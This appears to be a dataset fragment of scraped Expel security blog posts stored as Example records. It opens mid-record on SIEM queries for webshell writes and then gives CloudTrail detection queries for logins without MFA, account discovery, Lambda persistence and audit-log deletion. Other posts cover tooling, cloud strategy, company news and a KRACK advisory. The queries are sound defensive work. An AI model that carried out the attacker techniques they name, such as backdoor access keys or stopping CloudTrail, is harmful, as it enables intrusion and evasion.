(?i).*(wwwroot|htdocs).*.(aspx|jsp|cfm|asp|php), , , , ] and IPv4 Address and Operating System from all machines with Operating System containing "server" Sumo Logic Query Carbon Black "alert.watchlist.hit.query.process" OR "vulnerability" | join (json auto keys "interface_ip","process_path","ioc_attr","watchlist_name","computer_name","created_time", "ioc_attr" as interface_ip, process_path, ioc_match, watchlist_name, host_name, created_time, ioc_attr) as cb, (split _raw delim=\',\' extract 7 as gen_time, 9 as dst_ip, 33 as threat_id) as panw on cb.interface_ip = panw.dst_ip timewindow 15m | fields cb_interface_ip, cb_host_name, cb_process_path, cb_ioc_attr, panw_threat_id, cb_watchlist_name, panw_gen_time, cb_created_time Sumo Logic Query Tanium "Expel - Potential Webshell Write" OR "vulnerability" | join (json auto keys "Expel - Potential Webshell Write.IPv4 Address", "Expel - Potential Webshell Write.Process Path", "Expel - Potential Webshell Write.File Path", "Expel - Potential Webshell Write.QuestionName", "Expel - Potential Webshell Write.Endpoint Name" as interface_ip, process_path, file_path, question_name, host_name) as tn, (split _raw delim=\',\' extract 7 as gen_time, 9 as dst_ip, 33 as threat_id) as panw on tn.interface_ip = panw.dst_ip timewindow 15m | fields tn_interface_ip, tn_host_name, tn_process_path, tn_file_path, panw_threat_id, tn_question_name, panw_gen_time Happy Hunting!'}) (input_keys={'title'}),
  Example({'title': 'Generate Security Signals with Sumo Logic &amp; AWS Cloudtrail', 'url': 'https://expel.com/blog/following-cloudtrail-generating-aws-security-signals-sumo-logic/', 'date': 'Sep 10, 2019', 'contents': 'Subscribe  EXPEL BLOG Generate Strong Security Signals with Sumo Logic &amp; AWS Cloudtrail Security operations  7 MIN READ  DAN WHALEN  SEP 10, 2019  TAGS: Cloud security / Get technical / How to / Managed security / SOC As orgs increasingly shift some of their workloads to cloud providers like Amazon Web Services (AWS), its often challenging to get the right level of visibility into these new environments for security monitoring purposes. Sure, security professionals have had decades of experience monitoring traditional enterprise networks, but services like AWS, Microsoft Azure and Google Cloud Platform come with additional sources of valuable data  which is frustratingly unfamiliar if youre used to racking and stacking your own servers. Combine that uncertainty with an already long laundry list and the result is this: Most organizations using cloud platforms are not taking full advantage of the signals available to them. But theres some good news: There are lots of great technology solutions we can use to help us get a better handle on those signals. In this post, Ill show you how Expel uses a SIEM (in this example, well take a look at Sumo Logic ) to generate security leads from AWS signals. Regardless of what SIEM you use, Ill share some detection use cases (with examples!) that you can try out in your own environment. How does a SIEM help? Anyone who works in security knows that there are two high-level problems that need to be solved to effectively monitor an environment: Collecting the data you need; and Drawing actionable insights from the data A log management (aka SIEM) solution like Sumo Logic does all of the heavy lifting, connecting up to your sources of data and providing an intuitive search interface that lets you generate alerts and perform investigations. For example, you can easily onboard Amazon CloudTrail data from AWS with the built-in connector (more on CloudTrail in a moment). In a few easy steps, you can create a trail and get data flowing by granting Sumo Logic access to the S3 bucket containing the logs. This can be done right in the AWS console with a few button clicks or via the CloudTrail API and takes about five minutes. Once youve hooked up Sumo Logic, you can validate data flow by issuing queries against the CloudTrail data like so: Now that youve got data flowing, the next step is making sense of it. Building a detection strategy for Amazon CloudTrail Why Amazon CloudTrail is useful If you arent familiar with Amazon CloudTrail, think of it as an audit log of all AWS activities that happen in your account. By default, AWS enables a default CloudTrail for every account  it records the most essential events and retains them for 90 days. This is helpful as a default, but as a best practice its important to create your own CloudTrail that sends events to a S3 bucket of your choosing. This allows you to control the granularity of the events that get logged and the length of time those logs are retained. You can also use AWS Organizations to enforce a global CloudTrail that sends audit data from all of your AWS accounts (including all regions) to one master S3 bucket. This ensures that you never end up in a situation where youre missing audit data needed for a compliance requirement (or  oh noes!  an active security investigation). Making sense of CloudTrail data Getting data flowing is relatively easy, but making sense of it all can be overwhelming (especially if its the first time youre working with it). At Expel, we maintain a detection and response strategy for AWS that defines what signals we look for and how our team responds. To build a detection strategy, we consider the attack lifecycle and make sure we have layered signals in place to detect attacker or risky behaviors. We think about signal in terms of these three categories, which helps us identify areas of risk and brainstorm detection use cases. Access (how does someone enter the environment), Movement (how does data move around), and Storage (where does data live). Below are a few examples that show what some of these use cases look like: Brainstorming at a high level where your areas of risk are and what compensating controls (including detection use cases) you have in place is a healthy exercise that orgs should do routinely (We do this!). Generating valuable AWS signals Now Ill move on to the fun part. Lets dig into a few examples of CloudTrail-based signals that weve found valuable that might be helpful to you and your team (if youre lucky enough to have one) as well. Suspicious logins Credential theft isnt a new attack vector by any means, but its still an issue for orgs of all shapes and sizes. Particularly as orgs start to use AWS, managing developer credentials gets challenging. As a result, a compromise of a developer workstation can quickly lead to a greater compromise of an AWS environment if you dont have the right controls and signals in place. So how can you use CloudTrail logs to help zero in on this problem? Check out the query below as a starting point: _sourceCategory = {{sourceCategory}} | parse regex "(?&lt;raw&gt;{.*)" | json field=raw "eventName", "sourceIPAddress", "userAgent", "userIdentity.type", "userIdentity.arn", "userIdentity.userName", "additionalEventData.MFAUsed" as event_name, src_ip, user_agent, user_type, user_arn, user_name, mfa nodrop | lookup country_code from geo://location on ip = src_ip | where event_name = "ConsoleLogin" and mfa != "Yes" and country_code not in ("US") | count by country_code, mfa, user_type, user_arn, src_ip, user_agent What were looking for: AWS console logins where MFA wasnt used Unusual geo-location for the source IP address (customizable for your org) Tips and tricks: Consider time of day/day of week as a condition. Should anyone be logging in on the weekend? Account discovery Lets assume that an attacker gets authenticated access to an environment. What happens next? In our experience, an attacker usually starts to enumerate the AWS account, listing IAM Users, Groups and Roles, and generally poking around the account to understand it. One common side effect is a burst in API failures as the attacker may not have the necessary permissions to green light all of their attempted actions. Using this as a hypothesis, lets build a signal to alert when this happens: _sourceCategory = {{sourceCategory}} | parse regex "(?&lt;raw&gt;{.*)" | json field=raw "eventName", "errorCode", "errorMessage", "sourceIPAddress", "userIdentity.userName", "userIdentity.type", "eventSource" as event_name, error_code, error_msg, src_ip, user_name, user_type, event_source nodrop | where error_code = "AccessDenied" | timeslice 1h | count as failures, count_distinct(event_name) as methods, count_distinct(event_source) as sources by _timeslice, user_type, user_name, event_source, error_msg, src_ip | where failures &gt; 5 and methods &gt; 1 and sources &gt; 1 What were looking for: A burst in AccessDenied errors over a period of one hour Multiple unique failed API calls Multiple unique AWS services generating failures Tips and tricks: You may find some noisy service accounts when first implementing this signal. This is a good opportunity to fix any broken policy documents or exclude specific accounts that you expect to generate failures. Maintaining access If an attacker gains an initial foothold in an environment, the attacks next objective is to figure out a way to maintain that access. In a traditional enterprise, that might look like installing a service, setting up a scheduled task or creating a backdoor user account. What does this look like in AWS? It turns out there are some parallels  Rhino Security Labs has done a great job with Pacu, an open-source AWS exploitation toolkit (think Metasploit for AWS) that illustrates some of these behaviors. As an example, AWS Lambda can be used as a persistence mechanism: _sourceCategory = {{sourceCategory}} | parse regex "(?&lt;raw&gt;{.*)" | json field=raw "eventName", "userIdentity.invokedBy" as event_name, invoked_by nodrop | where invoked_by = "lambda.amazonaws.com" and event_name in ("CreateAccessKey", "AuthorizeSecurityGroupIngress", "UpdateAssumeRolePolicy") What were looking for: A lambda function executing a suspicious action by: Creating an access key to backdoor an IAM user Updating a security group to allow ingress on a port Updating an assume role policy to allow external access Tips and tricks: Implement least privilege to prevent these persistence mechanisms. Dont grant users access to services they dont need. Evading defenses As a final example, determined attackers attempt to evade detection. Since CloudTrail logs nearly everything an attacker might want to do in an environment, CloudTrail is also an attack target. If an attacker has the right permissions, he or she can stop and/or delete a CloudTrail, making it more difficult for an organization to identify threats and respond. You can identify this activity by looking for the following API calls: _sourceCategory = {{sourceCategory}} | parse regex "(?&lt;raw&gt;{.*)" | json field=raw "eventName", "sourceIPAddress", "userIdentity.arn", "userIdentity.type", "eventSource" as event_name, src_ip, user_arn, user_type, event_source nodrop | where event_name in ("DeleteTrail", "StopLogging", "DeleteLogGroup", "DeleteLogStream", "DeleteDestination") What were looking for: An attacker deleting audit data by: Stopping or deleting a CloudTrail Deleting a log group or stream from CloudWatch Deleting a CloudWatch destination Tips and tricks: Using AWS Organization trails are a huge help here. An attacker cant stop or delete a trail that is enforced by the master account. He or she also cant disable the default EventHistory trail that exists for each AWS account. Bringing it all together Getting all of this set up is a large step forward if youre just getting started with AWS monitoring, but Id be remiss if I didnt mention one last piece of this puzzle: operationalizing these alerts. All of this work would go to waste without a well thought-out process for alert triage and investigation (well dive deeper into that topic in a future blog post). Generating alerts is great, but youve got to make sure theyre getting in front of the right people. Sumo Logic (and most SIEM technologies) have multiple options including dashboards, in-console workflows and other ways to send notifications to external services via email or webhooks. You may decide, for example, that youd like to send a Slack message to a team of developers for activity that occurs in your development account. Alternatively, if you and/or your team is bogged down already with a million other to-dos and you simply dont have the bandwidth to develop and respond to alerts, consider working with a third party. Yes, were biased, but wed love to chat if you think we might be able to help. Getting a handle on your cloud infrastructure isnt always easy. Collecting and making use of audit data that these platforms generate  like AWS CloudTrail  is an important part of that mission and a good place to start.'}) (input_keys={'title'}),
  Example({'title': 'Get your security tools in order: seven tactics you should ...', 'url': 'https://expel.com/blog/get-security-tools-order-seven-tactics-know/', 'date': 'Sep 7, 2017', 'contents': 'Subscribe  EXPEL BLOG Get your security tools in order: seven tactics you should know Talent  3 MIN READ  YANEK KORFF  SEP 7, 2017  TAGS: Employee retention / Great place to work / Management / Selecting tech / Tools At the tail end of the last century (doesnt that sound a lot longer ago than 17 years?), the Gallup organization surveyed 80,000 managers over the course of 25 years. Their goal was to understand what truly exceptional managers do differently to drive performance and to create great places to work. Many of you are probably familiar with the book summarizing the results by Marcus Buckingham and Curt Coffman called  First, Break All The Rules . Ill spare you the entire book summary and draw your attention to one particular bit. Their research pointed to twelve questions, which, when answered affirmatively, correlate to a high-performance work environment. And one of those questions (in fact it was #2 on the list) was the following: Do I have the equipment and material I need to do my work right? Well now, that seems pretty straightforward. Of course youd want your people to have the right tools for the job. Who wouldnt do that? Turns out, almost everyone. Security operations centers (SOCs) are rife with inadequate, poorly integrated, dated technology that seems to frustrate security practitioners even if its functional most of the time. Is there a SIEM sitting around whose care and feeding stopped a few years ago and seems to deliver little but false positives anymore? Did you pick an endpoint detection and response (EDR) solution that truly was  the new hotness  three years ago only now to discover that theres another  new new hotness  in town? Or my current favorite: state of the art network packet capture devices monitoring links that have no visibility into sensitive data moving between third-party cloud providers. If youve hired well, these problems give rise to something interesting: intrepid security analysts spinning Python to work around limitations of existing technology and streamlining what they can. Does this help? Amazingly, it sure does. Being close to the problems and the associated technology means your analysts have unique insight into how to make their lives better. Go figure. The drawback? Theyre not software engineers. The solutions are brittle and difficult to maintain across churn. Are we at an impasse then? Are we destined to be working with sub-optimal technology that does little more than confound us and get in our way? Well, yes and no. Here are seven things to keep in mind to bring harmony to your toolchain. 1. There are no perfect tools Regardless of what you end up buying to solve your [insert security capability here] gap, the tool you choose will fall short in some way. Optimize for the capabilities that are most important to you and fill the gap another way. 2. Your imperfect tools need care and feeding Negligence degrades your tools performance. Maintaining operational rigor around maintenance is important, as is throwing out old tools when theyve passed their prime. 3. Track capabilities Whether youre talking about detection capability on the network, investigation capability on the endpoint, or vice-versa, keep an inventory of what tools are allegedly solving which problems. Avoid buying new tools just because its fun. 4. Evaluate visibility Beyond the capabilities your tools provide, each has a certain scope. Your EDR solutions visibility is governed by where agents are installed. Your packet sniffers can only see the links theyre plugged into. Your security analysts are already in an unfair fight: make sure theyre not fighting with blinders on. 5. Measure efficacy You have assumptions when you buy new security products. Do your detectors detect with a good signal-to-noise ratio? Are your investigative tools used frequently? Track not only frequency of use, but how youre getting faster over time. 6. Integrate Using imperfect tools is bad enough, hopping between frustrating consoles is worse. Encourage your security analysts to build software (ok, ok, write code) to mitigate alt-tab-copy-paste-death. To really turn it up to 11 , invest in professional SOC plumbers (experienced software engineers) who understand the operational realities. 7. Equipment and material is more than tools While weve focused heavily on tool choice in this post, operationalizing your tools is actually more important than their selection. Part of that is documentation. Playbooks. Without these, getting value out of your security investments depends on tribal knowledge, which is easily lost.  There are always clever new variations on old themes when it comes to security risks. Heck, some variations arent even that clever or that new  but manage to ruin your day anyway. So, your security apparatus cant be static either. Looking for a place to start? Once you get to the acceptance phase for #1 above, evaluate how well your existing tools are being maintained and address those gaps first. Work down the list from there. As you press forward with this journey, realize that change will be constant. Optimizing for this along the way will help ensure your security toolset adapts to your changing needs. Your security analysts will thank you for it. This is the first part of a five part series on key areas of focus to improve security team retention. Read the introduction, 5 ways to keep your security nerds happy , or continue to part two .'}) (input_keys={'title'}),
  Example({'title': 'Getting a grip on your cloud security strategy', 'url': 'https://expel.com/blog/getting-a-grip-on-your-cloud-security-strategy/', 'date': 'Oct 9, 2018', 'contents': 'Subscribe  EXPEL BLOG Getting a grip on your cloud security strategy Security operations  7 MIN READ  JEN BIELSKI  OCT 9, 2018  TAGS: Cloud security / How to / Overview / Planning Add up all of those selfies, food photos and iCloud backups and its no surprise that consumer cloud usage has increased 50% in the past five years. Companies are hot on their tail. In the past seven years, the number of organizations with at least one application or a portion of their infrastructure in the cloud has increased from 51% to 73% . Ready or not, the cloud is here. But what does that mean for security? Whats old is new (again) Its Groundhog Day! Or maybe Groundhog Decade? Cloud security today looks a lot like where traditional on-prem security was 10 or 15 years ago. Most people are just starting to think through how theyre going to build a security program around this new perimeter. For most, that starts with figuring out where their data is ( especially their sensitive data). Unfortunately, we cant just rinse and repeat what we did 15 years ago. While some things are the same, more has changed. User accounts are the new endpoints. Attackers can compromise your data without coming anywhere near your network. They just need to compromise a single user account. Thats a lot less work than popping a box, moving laterally and performing reconnaissance before they steal the data. It also means your focus needs to expand from where are my endpoints to what are my users doing? Questions like are my users logging in from places I dont expect them to? and does this user have permission to access sensitive data will uncover a lot more evildoers than looking for malware. Those front-row seats now come with an obstructed view. You cant point to the box that has your crown jewels anymore. In fact, youre no longer in full control of the walls that are protecting your data. That limited visibility means youve got to try a little harder to see the things that were once right in front of you. Speaking of control, its important to understand where the responsibility line is. What will your cloud vendor do vs. what do you need to care about? You need some new plays  and probably a whole new playbook. Coming up with a cloud security strategy is a little like playing a new game while the rules are being written. Whats OK for employees to do and thus what security needs to care about is in flux. For example, employees can upload and share a document in minutes with applications like Box, Dropbox and OneDrive. Thats convenient, but it also makes it easy for copies of your sensitive data to fly away. When it comes to the infrastructure, IT teams can flip the switch and spin up a new server or storage bucket. Policies to mitigate these new risks are playing catch-up and security is often left in the position of highlighting weird stuff thats going on so that someone can do something about it. Getting a grip on your cloud security strategy Its easy to try to push a round peg (traditional security) into a square hole (cloud security). Its what you know and its routine. Plus, finding the time to focus on strategy can be hard. Understanding how to think about cloud security differently is half the battle. At Expel, weve thought a lot about it, and weve identified three key points that should inform your cloud strategy. 1. Its part of your risk profile It can be unsettling when you ship your data to the cloud. Its easy to fall into the trap of assuming that just because you shipped it to a big-name vendor like Microsoft or Google that theyve got security covered. If your data lives in the cloud then its part of your perimeter. And if its part of your perimeter, then its another home on your plot of land to protect. That means youve got to include it in your risk profile. In the good old days, you could put a firewall around it and feel reasonably secure. But you cant put a traditional firewall around cloud applications like G Suite and O365. So youll need a strategy to mitigate the risk. The nice thing is that your cloud providers are responsible for things like infrastructure and networking. But in order to assess your risk, one of the key things you need to understand is where their responsibilities end and yours begin. Of course, youre responsible for what you put in the cloud, including your applications and data. But what else? Failing to understand where that line is can create holes in your risk profile and leave the gate open for an attacker (or employee) to steal or misuse sensitive documents. 2. It requires special focus It may be tempting to just take the logs from your cloud infrastructure and apps, send it to your SIEM and stir. Unfortunately, that wont get you very far. Why? The data you need to look at and the questions you need to ask are different. As I mentioned above, users are the new endpoints. Soinstead of looking for unusual endpoint behavior, a security analyst needs to look for unusual user behavior. And once they detect suspicious activity, they need to look for clues under rocks they havent turned over before  like AWS CloudTrail or O365 audit logs. Heres a quick example that illustrates what Im talking about. Shortly after onboarding a customer we detected a phishing attempt in their O365 environment. The phishing email came from a legitimate user. But once we dug deeper into the audit logs we discovered the attacker had changed a mailbox rule to evade detection and then sent out hundreds of emails without anyone noticing. This discovery allowed us to develop a new rule to detect similar activity in the future. The detection, investigation and future preventive steps were all unique to the cloud (and in some cases, unique to O365). Thats what we mean by special focus. 3. Cloud security has multiple parts When it comes to the cloud, its not a monolith. Its more like triplets. There are different parts to think about. Theyre all vying for your attention and you need to think about them differently. If you only focus on one  such as securing your cloud apps  you may be leaving the door to your cloud infrastructure unlocked for an attacker to walk right through. At Expel, we break cloud security into three different parts: cloud applications like O365, cloud infrastructure (aka servers in the sky) and highly elastic cloud infrastructure where youre auto scaling your servers based on load. Breaking cloud security into three parts Cloud applications Cloud infrastructure Elastic infrastructure Sample applications Office 365 Salesforce Okta AWS Azure Google Cloud AWS AutoScale Kubernetes What they are Software programs that are hosted in the cloud. If you log in to a website to use it, thats a cloud app. If you install it on your own hard drive, its not. A collection of servers, containers and virtual machines that are hosted by a third party. We call them servers in the sky. Basically, if your servers arent running in your own data center (or closet) youre probably using cloud infrastructure. An environment where youre rapidly provisioning and de-provisioning servers and other resources based on spikes in end user demand. Whats special about them Youve got less control and visibility over what users are doing and what data about their activity is available. Youve got less visibility into whats happening and how the infrastructure might get compromised. You need to understand how your applications behave and have visibility into what theyre doing at any point in time. Detection questions to ask If a user logs in from Los Angeles and three hours later logs in from Beijing, is this physically possible? Are your S3 buckets configured correctly? Did a user just upload sensitive data that is visible to the world? Are any of your servers reaching outside of your network? Each of these three approaches is so special that well be publishing a separate blog post on each of them to dive into the details (so subscribe to our blog! ). But for now, its important to note that you need to approach each of these three parts of the cloud differently than you treat your on-prem data and apps. So  where do you start? If youre reading this and saying to yourself that all sounds nice, but how do I get started? youre not alone. In fact, youre in good company. Here are a few ideas to help point you in the right direction: Inventory your cloud apps (and risk). Things like Office 365, Workday, Salesforce and ServiceNow are the obvious place to start. But chances are, there are dozens of different cloud apps in use across your company. Make a list and then rank them by risk. How bad would it be if an account were compromised or data was stolen from the app? Catalog all of your sensitive data (no matter where it is). With the march to the cloud all of your sensitive data probably isnt where you think it is. So go find it  even if youve got to send out a search party. Figure out what cloud security data youve got. Chances are, you can use a lot of the investments you already have. So map the signals you get from your existing security tech against the risks youve identified. Do you have the right logs for things like user authentication? Data access? Where do those logs go and can you get alerts from them? Can you perform historical queries? Put some basic controls in place. If youve completed the previous two steps youll have a good grasp on what your cloud-informed risk profile looks like. And there are some basic things you can put in place even while youre working on your broader cloud security strategy. For example, put identity management controls in place. Limit access to tasks like spinning up an S3 bucket in Amazon. Make sure that people who have admin access need it. And lock down login permissions by, for example, blocking logins from unusual IP locations. Implement two-factor authentication. This is a no-brainer and yet its amazing how many organizations dont do it. If your cloud apps offer two-factor authentication, make it mandatory. Period. Invest in training. As weve mentioned before, learning is fundamental . The cloud is a new frontier and securing your apps and data that live there requires new skills. Get your team closer to your developers. And, if you have some, send them to a conference or a class. Allocate time and budget for them to play around with cloud-specific tech. Finally, if youre looking to increase understanding across your organization of the need to beef up your approach to cloud security it might be useful to run an incident response tabletop exercise. Theres nothing like running through a real-life scenario to identify gaps, improve workflows and highlight areas that need new investment that can make you better prepared for when an incident does occur. And if youre having trouble getting people to attend, you might consider turning it into a game . Of course, if you come to the conclusion you need someone to monitor your cloud apps and infrastructure, were always happy to help :-).'}) (input_keys={'title'}),
  Example({'title': 'Good news in unusual times - Cybersecurity Company ...', 'url': 'https://expel.com/blog/good-news-in-unusual-times/', 'date': 'May 13, 2020', 'contents': 'Subscribe  EXPEL BLOG Good news in unusual times Expel insider  3 MIN READ  DAVE MERKEL, YANEK KORFF AND JUSTIN BAJKO  MAY 13, 2020  TAGS: Announcement / Company news / Managed security Youre probably expecting a pithy introduction to this blog post. And under normal circumstances, wed have one waiting for you. However, that tongue-in-cheek intro doesnt feel right given whats happening in our world right now. Which is why today were going to cut straight to the heart of what we want to share. Were incredibly grateful and humbled to tell you that weve raised a new round of funding. This time, our $50 Million Series D financing was led by CapitalG , Alphabets independent growth fund, with participation from many of our existing investors : Battery Ventures, Greycroft, Index Ventures, Paladin Capital Group and Scale Venture Partners. Were thankful that we get to continue on our journey to change the face of managed security  taking great care of our customers and our own crew along the way. And while were celebrating this news because its good for the businesses we help protect every day and the employees whove joined us on this journey, celebrating while theres an incredible amount of uncertainty in the world feels a bit uncomfortable. Its not lost on us how fortunate we are. Our hope is that with this new round of funding, we can continue to serve our customers (and add new ones to the Expel family) to the best of our abilities, making space for them to do more than chase alerts  at a time when they need that flexibility the most. Making space for teams to do what they love about security When we founded Expel nearly four years ago, we set out to provide our customers with greater peace of mind about security  whether theyre operating business as usual or facing more challenging circumstances. Our team had some initial core beliefs about the state of managed security that inspired us to build something different, and our customers have helped us confirm those beliefs: They want a security partner wholl give them answers to solve their most pressing security challenges, not just toss them a handful of alerts and say, You should really look into those. They want a tech-first approach to security, ideally where they can get value right away from the tools they already own versus being told to go buy new ones (we love the BYO tech approach too). More than anything, they want to get better and keep their companies secure, all while maintaining their own sanity and their teams  because anyone who has worked in security for any length of time knows that stress and burnout are very real. During initial conversations about what we wanted the Expel brand to be  years ago when we were all gathered around a table in Merks barn  we tossed around this idea of making space for our customers to do what they love about security. Since then, weve been thankful to hear directly from our customers about how weve supported them in making space. One of the more gratifying comments came from the CISO at a high-growth tech company who recently told us this: I get 8+ hours of sleep a night and my child recognizes me as their father again thanks to Expel. There couldnt be a better time than now to help our customers make space, whether its to work on more strategic security priorities for their business, support loved ones or care for their own health. The road ahead We know that so many are facing difficult times right now. Were optimistic, though, that the light at the end of the tunnel will ultimately be bright. Were incredibly grateful for this new round of funding, and look forward to continuing to serve our customers and take care of our own crew of Expletives. Thank you to everyone whos supported us on this journey so far: our employees, customers, partners, investors, family and friends. If theres one thing all of us wholeheartedly agree on, its that were privileged to work alongside such incredible people every day. Its times like these that make us really appreciate that.'}) (input_keys={'title'}),
  Example({'title': 'Got workloads in Microsoft Azure? Read this', 'url': 'https://expel.com/blog/workloads-in-microsoft-azure/', 'date': 'Jan 19, 2021', 'contents': 'Subscribe  EXPEL BLOG Got workloads in Microsoft Azure? Read this Security operations  1 MIN READ  PETER SILBERMAN, MATTHEW KRACHT AND MICHAEL BARCLAY  JAN 19, 2021  TAGS: Cloud security / MDR / Tech tools Anyone who performs detection and response in the cloud knows that figuring out how to get the right signal for analysts to efficiently do their job is  challenging. Running workloads in Microsoft Azure is no exception. But once you get your head around what signals you should turn on and how you can use that data, alert and log data available natively in Azure can be a powerful tool to help you keep attackers out of your environment. Our guidebook will help you get started on building your Azure detection and response strategy, not to mention figure out the difference between the numerous sources of security signal in Azure. Download our brand new Azure guidebook: Building a detection and response strategy , where well talk about: The available sources of logging and alert data in Azure; How to categorize each Azure Defender Service and understand what they do; Fields that Expel found most useful in triaging anomalous alerts; and A few of the lessons weve learned setting up Azure security signal (Hint: You can use these to inform and tweak your own security monitoring activities!). Well walk you through the types of signal and logging sources that are available in Azure, share guidance on what signal you should consider turning on so your analysts get the information they need (and arent bogged down with information they dont need), along with some considerations weve identified as we built out our own Azure detection and response strategy. Sound helpful? We hope so! Download your copy now'}) (input_keys={'title'}),
  Example({'title': "Grab your sneaks: we're gearing up to support a walk for a ...", 'url': 'https://expel.com/blog/grab-your-sneaks-were-gearing-up-to-support-a-walk-for-a-cause/', 'date': 'Oct 19, 2022', 'contents': 'Subscribe  EXPEL BLOG Grab your sneaks: were gearing up to support a walk for a cause Expel insider  1 MIN READ  CANDICE BRISTOW  OCT 19, 2022  TAGS: Company news At Expel, we love October. Coffee flavors are better. We get to celebrate Cybersecurity Awareness Month . Halloween! And its time for the annual Skechers Pier to Pier Friendship Walk . This event brings thousands together in California for a walk from Manhattan Beach Pier to Hermosa Beach Pier, and back, culminating in a day of celebrations. Co-produced by the Skechers Foundation and the Friendship Foundation , the walk raises money in support of children with disabilities and their families, and also to support public education and a national college scholarship programfunding one-on-one peer mentoring and social recreational activities, including summer camps, sporting events, cooking classes, music lessons, and more. Expel is a proud digital swag sponsor of this years walk. Were always thrilled to see our customers involved in initiatives that reflect our own values, and were so excited by the chance to support Skechers in this cause. The idea that were better when different is a core value at Expel. Since the beginning, weve worked hard to build an inclusive and welcoming place where people can do great work and where every person feels they can show up authentically. Our goal is to create a space for people to do what they love while strengthening our company regardless of race, gender, age, disability status, or any aspect of their identity or role. Were a stronger organization when we recognize, celebrate, and learn from those whose backgrounds and perspectives are different from our own. We believe that actively nurturing a culture of equity, inclusivity, and belonging is essential for our success, and we support those working with a broader spectrum of diversity, including these efforts by Skechers and the Friendship Foundation. On October 30, our own Jenn Karlsson (hey, Jenn ) will be at the Manhattan Beach Pier to join in on the fun. Follow along on social media ( @expel_io , @skechersp2pwalk , and @thefriendshipfoundation ) for pics from the day and to learn more about how you can participate in this life-changing initiative.'}) (input_keys={'title'}),
  Example({'title': 'Headand businessin the UK cloud(s)? We can help.', 'url': 'https://expel.com/blog/head-and-business-in-the-uk-clouds-we-can-help/', 'date': 'Mar 6, 2023', 'contents': 'Subscribe  EXPEL BLOG Headand businessin the UK cloud(s)? We can help. Expel insider  2 MIN READ  CHRIS WAYNFORTH  MAR 6, 2023  TAGS: Company news Expel is making its UK trade show debut at the Cloud &amp; Cyber Security Expo , 8th  9th March, and were absolutely buzzing about itto say the least. Why? Glad you asked. Aside from the chance to grab a pint with our peers in the security space, were looking forward to talking shop on all things cloud, because thats a language we speak fluently. In fact, our cloud detections are specific to Google Cloud Platform (GCP), Google Kubernetes Engine (GKE), Microsoft Azure, Amazon Web Services (AWS), and Amazon Elastic Kubernetes Engine (EKS). This means we can quickly detect and remediate the risks youd otherwise miss, whether attacks originate in the cloud, Kubernetes (k8s), SaaS apps, or even on-prem. We give the answers and outcomes you need to secure your cloud accurately and quickly. (Did we mention 98% of Expels detections originated from a detection written by Expel?) Sidebar: If youre reading closely (we sure hope that you are), you might have noticed we mentioned Kubernetes. Thats a pretty big deal for usor really any managed detection and response (MDR) providerbecause we just launched the general availability of Expel MDR for Kubernetes, the first-to-market offering of its kind. Learn all about it, including whether its right for your org, here . Now, where were we Right! Cloud security might be kind of our gig, but it certainly doesnt stop there. We help orgs of all shapes and sizes manage business risk. We use our technology, people, and expertise to provide businesses with security that makes sense. Expel Workbench, our security operations platform, lets us deliver clear answers and prescriptive advice to help your security team proactively identify and remediate vulnerabilities and threatsand do it with a mean time to remediation (MTTR) of 22 minutes. Our managed security products transparently thwart attackers and breaches, giving you confidence that your business is secure, your security investments are working, and your teams are focused on business prioritiesnot alerts. While youre at the Expo, swing by stand S-22 to meet our UK crew and schedule a demo if you want to see all this in action. Well also send you home with a summary of our annual threat report, Great eXpeltations . Its brimming with cybersecurity trends and predictions, right from our security operations centre (SOC), and full of insights and data you can use. By the way, if youre around on March 8, join us for a drink at the Good Hotel from 4pm to wind down from the day. Details and how to RSVP here  See you there . Cheers!'}) (input_keys={'title'}),
  Example({'title': 'Heads up: WPA2 vulnerability', 'url': 'https://expel.com/blog/heads-wpa2-vulnerability/', 'date': 'Oct 16, 2017', 'contents': 'Subscribe  EXPEL BLOG Heads up: WPA2 vulnerability Tips  1 MIN READ  BRUCE POTTER  OCT 16, 2017  TAGS: Alert / Heads up / Vulnerability Re: the WPA2 vulnerability. Details here: https://www.krackattacks.com . The TL;DR is dont flip out. This is an example of bug marketing and the infosec echo chamber getting way out in front of reality. Important bits There are multiple vulnerabilities. They all generally revolve around data decryption, injection, or replay. Attacks must be carried out on individual clients at a time. The attack does NOT affect all clients at once. Like any wireless attack, the attacker needs to be in relatively close proximity to execute. This VASTLY limits the attack surface as its more costly and risky for an attacker to execute than traditional network-borne attacks. Traffic that is otherwise protected is fine (TLS for example). The author makes some broad claims that TLS sessions arent secure b/c there are other attacks against TLS. Thats an over generalization. The story is different for local protocols that lack strong encryption. Vendors have known about this attack since August. Microsoft has already patched and others have as well. You can track progress here . Ultimately, these vulnerabilities are mostly of concern to organizations that are targets of well resourced, highly motivated attackers since attackers have to be close to targets, actively injecting traffic, and then they would have to use that access to exploit some other system in order to gain access. Most organizations do not fall into that category and should patch this vulnerability in their normal patching cycles. No need to go crazy addressing this announcement. You likely have far more pressing matters that will impact the security of your organization more than worrying about KRACK. One takeaway from this vulnerability is the importance of the security of higher level protocols. TLS and VPNs run over wireless networks insulate your endpoints from compromises of the network infrastructure. Consider focusing your energies on ensuring your wireless networks run resilient layer 3+ protocols to protect from layer 2 shenanigans.'}) (input_keys={'title'}),
  Example({'title': 'Help us make a wish come true', 'url': 'https://expel.com/blog/help-us-make-a-wish-come-true/', 'date': 'Apr 24, 2023', 'contents': 'Subscribe  EXPEL BLOG Help us make a wish come true Expel insider  1 MIN READ  KAITLIN RICKETTS  APR 24, 2023  TAGS: Company news Were pretty proud to count Make-A-Wish among our customers. In addition to the fantastic work they do in the U.S., they (and 30,000 volunteers) now grant wishes internationally in 50 countries on six continents through 40 affiliates. All told, theyve granted more than 550,000 wishes for children with critical illnesses worldwide since 1980. Every day, more than 35 wishes, on average, are granted throughout the U.S. and its territories. Thats incredible. Now, lets make it even better. Expel is planning to make a donation to Make-A-Wish on World Wish Day, April 29. You can brighten a few more faces by sharing your story through a review on G2 by April 28. For each customer review received, well make a contribution to our donation goal of $10,000. (BTW, reviews are anonymous, and please, be 100% honest . Not only will you help us reach our goal, but your comments can inform decisions your peers in other organizations are making. And anonymous third-party insight is gold to us.) Expel works to actively nurture a culture of equity, inclusivity and belonging in everything we do. This means creating a safe place where everyone feels theyre valued and that they belong. Everyone should be treated with kindness, and not many organizations do this better than Make-A-Wish. Were committed to helping them do even more, and we hope youll help us reach our goal.'}) (input_keys={'title'}),
